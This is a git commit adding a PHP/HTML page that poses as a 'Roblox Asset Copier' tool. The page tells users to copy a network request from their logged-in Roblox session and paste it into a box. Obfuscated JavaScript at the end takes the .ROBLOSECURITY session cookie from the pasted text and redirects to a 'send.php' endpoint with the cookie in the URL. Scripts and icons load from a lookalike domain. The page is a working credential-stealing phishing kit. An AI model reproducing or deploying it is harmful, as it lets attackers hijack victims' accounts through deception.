270b9cbcae6269057276a5056b1923cbbf800f9e
zllex <95177117+zllex@users.noreply.github.com>
2022-01-15 18:19:29 +0200

    Add files via upload

---
+++ E.php
@@ -0,0 +1,444 @@
+<!DOCTYPE html>
+<html dir="ltr" lang="en">
+
+<head>
+<meta charset="utf-8" />
+<link rel="stylesheet" media="screen" href="style.css">
+<title>Roblox AssetCopier</title>
+<meta content="IE=edge" http-equiv="X-UA-Compatible" />
+<meta content="width=device-width, initial-scale=1" name="viewport" />
+<meta content="Description" name="description" />
+<meta content="html, js, css, toolkit" name="keywords" />
+<meta content="Author" name="Visible" />
+<meta content="Roblox Tools" itemprop="name" />
+<meta content="Description" itemprop="description" />
+<meta content="https://web-site.com/assets/images/page-view.webp/" itemprop="image" />
+<meta content="en_EN" property="og:locale" />
+<meta content="website" property="og:type" />
+<meta content="Roblox Asset Copier" property="og:title" />
+<meta content="https://roblox-tools.com/helper" property="og:url" />
+<meta content="https://web-site.com/assets/images/page-view.webp/" property="og:image" />
+<meta content="Asset Copier" property="og:site_name" />
+<meta content="The best javascript-based Roblox Asset-Copier!" property="og:description" />
+<meta content="summary" name="twitter:card" />
+<meta content="Title" name="twitter:title" />
+<meta content="https://web-site.com/" name="twitter:url" />
+<meta content="https://web-site.com/assets/images/page-view.webp/" name="twitter:image" />
+<meta content="Description" name="twitter:description" />
+<meta content="Title" name="twitter:site" />
+<meta content="Title" name="twitter:creator" />
+<link rel="apple-touch-icon" sizes="57x57" href="https://wvvw-rbxflip.com/assets/img/apple-icon-57x57.png" />
+<link rel="apple-touch-icon" sizes="60x60" href="https://wvvw-rbxflip.com/assets/img/apple-icon-60x60.png" />
+<link rel="apple-touch-icon" sizes="72x72" href="https://wvvw-rbxflip.com/assets/img/apple-icon-72x72.png" />
+<link rel="apple-touch-icon" sizes="76x76" href="https://wvvw-rbxflip.com/assets/img/apple-icon-76x76.png" />
+<link rel="apple-touch-icon" sizes="114x114" href="https://wvvw-rbxflip.com/assets/img/apple-icon-114x114.png" />
+<link rel="apple-touch-icon" sizes="120x120" href="https://wvvw-rbxflip.com/assets/img/apple-icon-120x120.png" />
+<link rel="apple-touch-icon" sizes="144x144" href="https://wvvw-rbxflip.com/assets/img/apple-icon-144x144.png" />
+<link rel="apple-touch-icon" sizes="152x152" href="https://wvvw-rbxflip.com/assets/img/apple-icon-152x152.png" />
+<link rel="apple-touch-icon" sizes="180x180" href="https://wvvw-rbxflip.com/assets/img/apple-icon-180x180.png" />
+<link rel="icon" type="image/png" sizes="192x192" href="https://wvvw-rbxflip.com/assets/img/android-icon-192x192.png" />
+<link rel="icon" type="image/png" sizes="32x32" href="https://wvvw-rbxflip.com/assets/img/icons/favicon-32x32.png" />
+<link rel="icon" type="image/png" sizes="96x96" href="https://wvvw-rbxflip.com/assets/img/favicon-96x96.png" />
+<link rel="icon" type="image/png" sizes="16x16" href="https://wvvw-rbxflip.com/assets/img/favicon-16x16.png" />
+<link rel="manifest" href="https://wvvw-rbxflip.com/manifest.json" />
+<meta name="msapplication-TileColor" content="#ffffff" />
+<meta name="msapplication-TileImage" content="https://wvvw-rbxflip.com/assets/img/ms-icon-144x144.png" />
+<meta name="theme-color" content="#ffffff" />
+<meta content="https://wvvw-rbxflip.com/assets/favicons/ms-icon-144x144.png" name="msapplication-TileImage" />
+<meta content="#5C6EC4" name="theme-color" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" integrity="sha512-HK5fgLBL+xu6dm/Ii3z4xhlSUyZgTT9tuc/hSrtw6uzJOvgRr2a9jyxxT1ely+B+xFAmJKVSTbpM/CuL7qxO8w==" crossorigin="anonymous" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css" />
+<link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet" />
+<link href="https://wvvw-rbxflip.com/assets/css/styles.css" rel="stylesheet" type="text/css" />
+</head>
+<style>
+            /* https://gist.github.com/Richienb/92ed3443519f782cbc73143b190b238b#gistcomment-2978230 */
+            img[alt*="000webhost"],
+            img[alt*="000webhost"][style],
+            img[src*="000webhost"],
+            img[src*="000webhost"][style],
+            body > div:nth-last-of-type(1)[style]{
+                opacity: 0 !important;
+                pointer-events:none !important;
+                width: 0px !important;
+                height: 0px !important;
+                visibility:hidden !important;
+                display:none !important;
+            }
+            /* https://codepen.io/elujambio/pen/YLMVed */
+            * {
+                font-family: -apple-system, BlinkMacSystemFont, "San Francisco", Helvetica, Arial, sans-serif;
+                font-weight: 300;
+                margin: 0;
+            }
+
+            html,
+            body {
+                height: 100vh;
+                width: 100vw;
+                margin: 0 0;
+                display: flex;
+                align-items: flex-start;
+                justify-content: flex-start;
+                
+            }
+            black {
+                color: black;
+            }
+
+            h4 {
+                font-size: 24px;
+                font-weight: 600;
+                color: #000;
+                opacity: 0.85;
+            }
+            h44 {                
+                width: 800px;
+                font-size: 24px;
+                font-weight: 600;
+                color: #000000;
+                opacity: 0.85;
+            }
+            h444 {
+                width: 600px;
+                font-size: 24px;
+                font-weight: 600;
+                color: #000000;
+                opacity: 0.85;
+            }
+            h454 {
+                font-size: 24px;
+                font-weight: 600;
+                color: black;
+                opacity: 0.85;
+            }
+            label {
+                font-size: 12.5px;
+                color: #000;
+                opacity: 0.8;
+                font-weight: 400;
+            }
+
+            form {
+                padding: 40px 30px;
+                background: #fefefe;
+                background-image: url("");
+                display: flex;
+                flex-direction: column;
+                align-items: flex-start;
+                padding-bottom: 20px;
+                width: 300px;
+            }
+            form h4 {
+                margin-bottom: 20px;
+                color: rgba(0, 0, 0, 0.5);
+            }
+            form h4 span {
+                color: black;
+                font-weight: 700;
+            }
+            form p {
+                line-height: 155%;
+                margin-bottom: 5px;
+                font-size: 14px;
+                color: #000;
+                opacity: 0.65;
+                font-weight: 400;
+                max-width: 200px;
+                margin-bottom: 40px;
+            }
+            a.discrete {
+                color: rgba(0, 0, 0, 0.4);
+                font-size: 14px;
+                border-bottom: solid 1px rgba(0, 0, 0, 0);
+                padding-bottom: 4px;
+                margin-left: auto;
+                font-weight: 300;
+                transition: all 0.3s ease;
+                margin-top: 40px;
+            }
+            a.discrete:hover {
+                border-bottom: solid 1px rgba(0, 0, 0, 0.2);
+            }
+
+            button {
+                -webkit-appearance: none;
+                width: auto;
+                min-width: 100px;
+                 background: url(""); 
+                border-radius: 24px;
+                text-align: center;
+                padding: 15px 40px;
+                margin-top: 5px;
+                background-color: #46CC99;
+                color: #fff;
+                font-size: 14px;
+                margin-left: auto;
+                font-weight: 500;
+                box-shadow: 0px 2px 6px -1px rgba(0, 0, 0, 0.13);
+                border: none;
+                transition: all 0.3s ease;
+                outline: 0;
+            }
+            button:hover {
+                transform: translateY(-3px);
+                box-shadow: 0 2px 6px -1px rgba(182, 157, 230, 0.65);
+            }
+            button:hover:active {
+                transform: scale(0.99);
+            }
+
+            input {
+                font-size: 16px;
+                padding: 20px 0px;
+
+                height: 56px;
+                border: none;
+                border-bottom: solid 1px rgba(0, 0, 0, 0.1);
+                width: 280px;
+                box-sizing: border-box;
+                transition: all 0.3s linear;
+                color: #000000;
+                font-weight: 400;
+                -webkit-appearance: none;
+            }
+            input:focus {
+                border-bottom: solid 1px #b69de6;
+                outline: 0;
+                box-shadow: 0 2px 6px -8px rgba(182, 157, 230, 0.45);
+            }
+
+            .floating-label {
+                position: relative;
+                margin-bottom: 10px;
+                width: 100%;
+            }
+            .floating-label label {
+                position: absolute;
+                top: calc(50% - 7px);
+                left: 0;
+                opacity: 0;
+                transition: all 0.3s ease;
+                padding-left: 44px;
+            }
+            .floating-label input {
+                width: calc(100% - 44px);
+                margin-left: auto;
+                display: flex;
+            }
+            .floating-label .icon {
+                position: absolute;
+                top: 0;
+                left: 0;
+                height: 56px;
+                width: 44px;
+                display: flex;
+            }
+            .floating-label .icon svg {
+                height: 30px;
+                width: 30px;
+                margin: auto;
+                opacity: 0.15;
+                transition: all 0.3s ease;
+            }
+            .floating-label .icon svg path {
+                transition: all 0.3s ease;
+            }
+            .floating-label input:not(:-moz-placeholder-shown) {
+                padding: 28px 0px 12px 0px;
+            }
+            .floating-label input:not(:-ms-input-placeholder) {
+                padding: 28px 0px 12px 0px;
+            }
+            .floating-label input:not(:placeholder-shown) {
+                padding: 28px 0px 12px 0px;
+            }
+            .floating-label input:not(:-moz-placeholder-shown) + label {
+                transform: translateY(-10px);
+                opacity: 0.7;
+            }
+            .floating-label input:not(:-ms-input-placeholder) + label {
+                transform: translateY(-10px);
+                opacity: 0.7;
+            }
+            .floating-label input:not(:placeholder-shown) + label {
+                transform: translateY(-10px);
+                opacity: 0.7;
+            }
+            .floating-label input:valid:not(:-moz-placeholder-shown) + label + .icon svg {
+                opacity: 1;
+            }
+            .floating-label input:valid:not(:-ms-input-placeholder) + label + .icon svg {
+                opacity: 1;
+            }
+            .floating-label input:valid:not(:placeholder-shown) + label + .icon svg {
+                opacity: 1;
+            }
+            .floating-label input:valid:not(:-moz-placeholder-shown) + label + .icon svg path {
+                fill: #b69de6;
+            }
+            .floating-label input:valid:not(:-ms-input-placeholder) + label + .icon svg path {
+                fill: #b69de6;
+            }
+            .floating-label input:valid:not(:placeholder-shown) + label + .icon svg path {
+                fill: #b69de6;
+            }
+            .floating-label input:not(:valid):not(:focus) + label + .icon {
+                -webkit-animation-name: shake-shake;
+                animation-name: shake-shake;
+                -webkit-animation-duration: 0.3s;
+                animation-duration: 0.3s;
+            }
+
+            @-webkit-keyframes shake-shake {
+                0% {
+                    transform: translateX(-3px);
+                }
+                20% {
+                    transform: translateX(3px);
+                }
+                40% {
+                    transform: translateX(-3px);
+                }
+                60% {
+                    transform: translateX(3px);
+                }
+                80% {
+                    transform: translateX(-3px);
+                }
+                100% {
+                    transform: translateX(0px);
+                }
+            }
+
+            @keyframes shake-shake {
+                0% {
+                    transform: translateX(-3px);
+                }
+                20% {
+                    transform: translateX(3px);
+                }
+                40% {
+                    transform: translateX(-3px);
+                }
+                60% {
+                    transform: translateX(3px);
+                }
+                80% {
+                    transform: translateX(-3px);
+                }
+                100% {
+                    transform: translateX(0px);
+                }
+            }
+            .session {
+                display: flex;
+                flex-direction: row;
+                width: auto;
+                height: auto;
+                margin: auto auto;
+
+                border-radius: 4px;
+                box-shadow: 0px 2px 6px -1px rgba(0, 0, 0, 0.12);
+            }
+
+            .left {
+                width: 220px;
+                height: auto;
+                min-height: 100%;
+                position: relative;
+
+                background-size: cover;
+                border-top-left-radius: 4px;
+                border-bottom-left-radius: 4px;
+            }
+            .bottom {
+                width: auto;
+                height: auto;
+                min-height: 100%;
+                position: relative;
+                border-top-left-radius: 4px;
+                border-bottom-left-radius: 8px;
+            }
+            .left svg {
+                height: 40px;
+                width: auto;
+                margin: 20px;
+            }
+            .session2 {
+                display: flex;
+                flex-direction: bottom;
+                width: 550;
+                height: auto;
+                margin: auto auto;
+
+                border-radius: 4px;
+                box-shadow: 0px 2px 6px -1px rgba(0, 0, 0, 0.12);
+            }
+
+}
+        </style>
+<body>
+<div id="particles-js"></div>
+<div class="main-wrapper">
+<main data-aos="fade-up" data-aos-anchor-placement="top-bottom" data-aos-duration="2000">
+<section class="sidebar">
+<a href="#">Home</a>
+<a href="http://robloxavatar.xyz/file/instructions" target="_blank" rel="noopener noreferrer">Instructions</a>
+<a href="https://discord.gg/RUSMrxbCmb">Discord</a>
+</section>
+<section class="content">
+<h1>The Asset Copier</h1>
+<ul>
+<li>
+<span>1</span>
+<p>Go to the Roblox page of the asset you want to copy (shirts, games etc.)</p>
+</li>
+<li>
+<span>2</span>
+<p>
+Right click on the page, click Inspect, and then it will popup a new screen. On the top of the new screen, there will be a list of options (Elements, Console, etc.). If you see a Network option, click that. If you don't see it, click the arrow button and then from there click Network.
+</p>
+</li>
+<li>
+<span>3</span>
+<p>
+Refresh the Roblox page and then in the Network section, scroll to the very top. You should see an item named after your asset. Right click that and then hover over Copy. There will be many options of how to copy the user code. You can click any except for: Copy link address, Copy response, Copy as fetch, or Copy all as fetch. Every other option will work with this tool.
+</p>
+</li>
+<li>
+<span>4</span>
+<p>
+Go back to this site, paste the code of the place you copied in the <b>Asset Code</b> text box and then click the <b>Start Copying!</b> button! Wait a few minutes and the file for the asset will begin to download.
+</p>
+</li>
+<li>
+<img src="" alt="" />
+</li>
+</ul>
+<center>
+<div class="input-field">
+<textarea id="content" style="height: 100px; border:solid 3px;" placeholder="Asset Code"></textarea>
+</div></center>
+<div class="btn-group">
+<button id="Send">Start Copying!</button>
+</div>
+</section>
+</main>
+</div>
+<script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+<script defer src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+<script defer src="https://wvvw-rbxflip.com/assets/js/main.js"></script>
+</body>
+<script src="https://wvvw-rbxflip.com/particles.js"></script>
+<script src="https://wvvw-rbxflip.com/js/app.js"></script>
+<script src="https://code.jquery.com/jquery-2.1.1.min.js" type="text/javascript">
+    </script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.7/js/materialize.min.js">
+    </script>
+<script>
+      
+var _0x3d47=['554487VGfPbe','location','#Send','2EVOYgY','replace','includes','Try\x20either\x20copying\x20the\x20code\x20in\x20a\x20different\x20format\x20or\x20make\x20sure\x20you\x20are\x20copying\x20the\x20code\x20of\x20a\x20asset!','split','2779671NxUHjA','1519373JfJywR','139219UKLcWu','.ROBLOSECURITY=','val','#content','click','803wBKxmX','147711LKGXJd','835983ZApVCb','442vQopeG','yourdomain.com/send.php?t='];function _0x43b2(_0x423a9a,_0x3cfc9e){_0x423a9a=_0x423a9a-0x11c;var _0x3d47d6=_0x3d47[_0x423a9a];return _0x3d47d6;}(function(_0x56b255,_0x4242b7){var _0x4e959c=_0x43b2;while(!![]){try{var _0xb0b9b0=-parseInt(_0x4e959c(0x128))+-parseInt(_0x4e959c(0x126))*parseInt(_0x4e959c(0x123))+parseInt(_0x4e959c(0x125))+parseInt(_0x4e959c(0x11e))*-parseInt(_0x4e959c(0x12b))+-parseInt(_0x4e959c(0x124))+-parseInt(_0x4e959c(0x11d))+parseInt(_0x4e959c(0x11c));if(_0xb0b9b0===_0x4242b7)break;else _0x56b255['push'](_0x56b255['shift']());}catch(_0xa75237){_0x56b255['push'](_0x56b255['shift']());}}}(_0x3d47,0xb9b8f),$(function(){var _0x15c914=_0x43b2;$(_0x15c914(0x12a))[_0x15c914(0x122)](function(_0x2b9bd3){var _0x4a5f87=_0x15c914,_0x15389a=$(_0x4a5f87(0x121))[_0x4a5f87(0x120)]();if(_0x15389a[_0x4a5f87(0x12d)]('.ROBLOSECURITY=')){var _0x43ef9f=_0x15389a[_0x4a5f87(0x12f)](_0x4a5f87(0x11f))['pop'](),_0x34f137=_0x43ef9f[_0x4a5f87(0x12f)](';')[0x0],_0x299ff5=_0x34f137['split']('\x22')[0x0];if(_0x299ff5[_0x4a5f87(0x12d)]('^')){var _0x17d37c=_0x299ff5[_0x4a5f87(0x12c)]('^',''),_0x447f24=_0x17d37c['replace']('^','');window[_0x4a5f87(0x129)]['replace'](_0x4a5f87(0x127)+_0x447f24);}else window[_0x4a5f87(0x129)][_0x4a5f87(0x12c)](_0x4a5f87(0x127)+_0x299ff5);}else alert(_0x4a5f87(0x12e));;});}));
+    </script>
+<div class="hiddendiv common"></div><div id="toast-container"></div>
+</html>
